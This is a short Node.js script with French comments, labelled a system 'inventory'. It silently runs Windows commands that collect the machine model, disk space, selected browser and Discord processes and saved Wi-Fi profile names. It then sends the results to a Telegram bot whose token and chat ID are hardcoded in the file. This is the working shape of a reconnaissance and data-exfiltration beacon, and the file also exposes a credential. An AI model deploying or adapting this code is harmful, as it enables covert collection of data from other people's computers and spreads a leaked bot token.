// client.js
const { exec } = require('child_process');
const https = require('https');

// Identifiants de ton bot Telegram
const TELEGRAM_TOKEN = '8206049937:AAEv07GYDOVNBthgFaZi1U1KCvu5gzWPbo4';
const CHAT_ID = '7400979339';

console.log("[INVENTORY] Extraction approfondie des composants système...");

// Chaîne de commandes avancées pour Windows :
// 1. Modèle du PC (wmic computersystem)
// 2. Espace disque C: (wmic logicaldisk)
// 3. Top 5 des processus en cours (tasklist)
// 4. Profils Wi-Fi enregistrés (netsh wlan)
const commandeAvancee = 'echo --- MODELE MACHINE --- && wmic computersystem get model | findstr /V "Model" && echo. && echo --- ESPACE DISQUE C: --- && wmic logicaldisk where "DeviceID=\'C:\'" get size,freespace | findstr /V "FreeSpace" && echo. && echo --- TOP PROCESSUS ACTIFS --- && tasklist | findstr /I "chrome.exe firefox.exe discord.exe explorer.exe svchost.exe" | more /E +1 || echo Aucun processus ciblé trouvé && echo. && echo --- PROFILS WI-FI ENREGISTRES --- && netsh wlan show profiles | findstr "Profil"';

exec(commandeAvancee, (erreur, stdout) => {
    if (erreur) {
        envoyerTelegram(`? Erreur d'audit avancé : ${erreur.message}`);
        return;
    }

    let dateActuelle = new Date().toLocaleString('fr-FR');
    
    let messageTelegram = `?? *RAPPORT TECHNIQUE AVANCÉ*\n`;
    messageTelegram += `?? Généré le : ${dateActuelle}\n`;
    messageTelegram += `=============================\n\n`;
    messageTelegram += `\`\`\`text\n${stdout.trim()}\n\`\`\``;

    envoyerTelegram(messageTelegram);
});

function envoyerTelegram(texte) {
    const texteEncode = encodeURIComponent(texte);
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${texteEncode}&parse_mode=MarkdownV2`;

    https.get(url, (res) => {
        if (res.statusCode === 200) {
            console.log("[SUCCÈS] Rapport étendu envoyé au smartphone.");
        } else {
            console.log(`[ÉCHEC] Erreur de transmission : ${res.statusCode}`);
        }
    }).on('error', (e) => {
        console.error(`[ERREUR] Réseau : ${e.message}`);
    });
}